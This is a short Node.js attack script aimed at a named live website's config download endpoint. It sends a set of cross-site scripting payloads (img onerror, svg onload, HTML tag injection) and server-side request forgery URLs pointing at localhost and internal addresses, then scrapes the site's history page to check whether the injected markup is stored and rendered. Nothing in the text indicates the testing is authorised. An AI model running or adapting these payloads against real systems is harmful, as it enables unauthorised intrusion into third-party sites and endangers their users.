import { makeClient } from './lib.mjs';
import fs from 'fs';
const c = makeClient('https://tutorialinjectid.my.id');
const TARGET = '/config/index.php?page=1';
const HDRS = { 'content-type': 'application/x-www-form-urlencoded', accept: 'application/json, text/plain, */*', origin: 'https://tutorialinjectid.my.id', referer: 'https://tutorialinjectid.my.id/config/' };
const P = process.argv[2] || 'scan';

const cases = {
  html_plain: 'https://sfile.co/<b>PWNMARK1</b>',
  html_img: 'https://sfile.co/QWER<img src=x onerror=alert(91)>PWNMARK2',
  quote_break: 'https://sfile.co/QWER"><b style="color:red">PWNMARK3</b>',
  raw_no_scheme: 'PWNMARK4-<svg/onload=alert(92)>',
  ssrf_local: 'http://127.0.0.1/info.php',
  ssrf_port1: 'http://127.0.0.1:1/x',
  ssrf_slow: 'http://10.255.255.1/x',
  ssrf_self: 'https://tutorialinjectid.my.id/tv/tv.php',
  bad_host: 'https://contoh-tidak-ada-xyz.invalid/x',
};

await c.get(TARGET);
let keys = P === 'scan' ? ['html_plain'] : P.split(',');
for (const k of keys) {
  const url = cases[k]; if (!url) continue;
  const body = new URLSearchParams({ action: 'process_download', config_url: url, config_title: 't' }).toString();
  const t0 = Date.now();
  let r = await c.get(TARGET, { method: 'POST', body, headers: HDRS });
  if (/wsidchk/.test(r.body)) { r = await c.get(TARGET, { method: 'POST', body, headers: HDRS }); }
  console.log(`\n### ${k}  url=${url}  ${Date.now() - t0}ms  status=${r.status}`);
  console.log('   RESP:', r.body.replace(/\s+/g, ' ').slice(0, 300));
}
const g = await c.get('/config/');
fs.writeFileSync('/tmp/opencode/config_after.html', g.body);
const h = g.body.match(/id="historyList"[\s\S]{0,2600}/);
console.log('\n=== RAW HTML HISTORY (mentah) ===');
console.log(h ? h[0].replace(/></g, '>\n<').split('\n').slice(0, 30).join('\n') : 'history tidak ketemu');
